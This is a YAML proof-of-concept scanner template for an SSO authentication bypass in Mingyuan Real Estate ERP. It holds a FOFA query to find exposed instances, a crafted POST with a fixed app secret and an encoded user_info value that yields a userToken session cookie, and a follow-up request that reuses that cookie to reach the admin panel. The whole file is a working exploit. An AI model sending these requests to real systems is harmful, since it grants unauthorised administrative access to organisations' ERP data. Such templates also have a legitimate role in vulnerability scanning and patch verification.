id: poc-yaml-mysoft-erp-sso-identity-authentication-bypass
info:
  name: 明源地产ERP sso 身份认证绕过漏洞
  severity: high
  tags:
  - 认证绕过
  finger: 明源地产ERP
  fofa: body="明源地产ERP" || body="/PubPlatform/Login/index.aspx"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /PubPlatform/nav/login/sso/login.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: __yzsAppSecret=testtest&user_info=%66%79%6d%71%35%62%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d
  expression: status_code == 302 && contains(headers,"userToken=")
  output:
  - regex_match(headers,"userToken=(?P<usertoken>.*?);")
- method: GET
  path: /PubPlatform/nav/home/default?_nav=0000
  headers:
    Cookie: userToken={{.usertoken}};
  expression: status_code == 200 && contains(body,"系统管理") && contains(body,"组织架构")
    && contains(body,"角色管理")
transport: http
